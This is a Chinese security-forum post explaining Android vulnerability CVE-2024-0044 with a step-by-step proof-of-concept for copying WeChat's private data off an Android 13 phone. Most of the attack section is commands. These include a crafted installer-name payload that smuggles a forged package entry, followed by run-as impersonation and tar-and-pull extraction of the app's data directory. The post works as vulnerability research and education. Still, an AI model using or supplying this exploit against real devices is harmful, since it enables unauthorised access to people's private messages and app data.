> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.kanxue.com](https://bbs.kanxue.com/thread-282373.htm)

> 利用 CVE_2024_0044 获取手机 (Android12/13) 上的应用数据

漏洞描述
====

CVE-2024-0044 是一项高危漏洞，影响 Android 12 和 13 版本，该漏洞位于 PackageInstallerService.java 文件的 createSessionInternal 函数中。此漏洞允许攻击者执行 "run-as any app" 攻击，从而在不需要用户交互的情况下实现本地特权升级。问题出现在 createSessionInternal 函数中的输入验证不当。攻击者可以通过操纵会话创建过程来利用此漏洞，可能会未经授权地访问敏感数据并在受影响设备上执行未经授权的操作。

_该漏洞由 Meta Security 发现：_

[https://rtx.meta.security/exploitation/2024/03/04/Android-run-as-forgery.html](https://rtx.meta.security/exploitation/2024/03/04/Android-run-as-forgery.html)

_Tiny hack 总结并分享了概念证明：_

[https://tinyhack.com/2024/06/07/extracting-whatsapp-database-or-any-app-data-from-android-12-13-using-cve-2024-0044/?s=03](https://tinyhack.com/2024/06/07/extracting-whatsapp-database-or-any-app-data-from-android-12-13-using-cve-2024-0044/?s=03)

_有关安全补丁的详细信息，请参阅 Android 安全公告：_

[https://source.android.com/docs/security/bulletin/2024-03-01](https://source.android.com/docs/security/bulletin/2024-03-01)

poc 实践
------

参考 [https://github.com/pl4int3xt/cve_2024_0044](https://github.com/pl4int3xt/cve_2024_0044)

目标：提取手机上微信数据。

手机：小米 10 HyberOS1.0.5.0TJBCNXM Android13 补丁时间：2024-03-01

1. 查看微信 uid

利用 adb shell 命令查看微信的 uid

```
$ pm list package -U |grep com.tencent.mm

```

执行后可以得到微信 uid 10314  
![](https://bbs.kanxue.com/upload/attach/202407/917329_HQVHWDUVRSMKVT5.webp)  
2. 推送任意一个 app 到`/data/local/tmp`目录下，这里采用参考文章一样的 [F-Droid.apk](https://f-droid.org/)

```
adb push F-Droid.apk /data/local/tmp/F-Droid.apk

```

3. 执行 poc，这里将 uid 替换为微信的 uid，victim 这个名称也是可以改的；这里是直接复制下面的代码到 adb shell 命令框中的

```
PAYLOAD="@null
victim 10314 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null"
pm install -i "$PAYLOAD" /data/local/tmp/F-Droid.apk

```

![](https://bbs.kanxue.com/upload/attach/202407/917329_3AZEUQNYTM4AYXA.webp)  
4. 切换为微信用户

```
$ run-as victim

```

![](https://bbs.kanxue.com/upload/attach/202407/917329_5MBXZ73NDVVMZ6P.webp)  
可以看到此时 shell 已经是微信 uid 了。

5. 获取微信数据

```
umi:/ $ mkdir /data/local/tmp/mm/                                                                           
umi:/ $ touch /data/local/tmp/mm/mm.tar
umi:/ $ chmod -R 0777 /data/local/tmp/mm/
umi:/ $ run-as victim
umi:/data/user/0 $ tar -cf /data/local/tmp/mm/mm.tar com.tencent.mm

```

拉取数据

```
adb pull /data/local/tmp/mm/mm.tar

```

[[培训]《安卓高级研修班 (网课)》月薪三万计划，掌握调试、分析还原 ollvm、vmp 的方法，定制 art 虚拟机自动化脱壳的方法](https://www.kanxue.com/book-section_list-84.htm)

[#漏洞相关](forum-161-1-123.htm)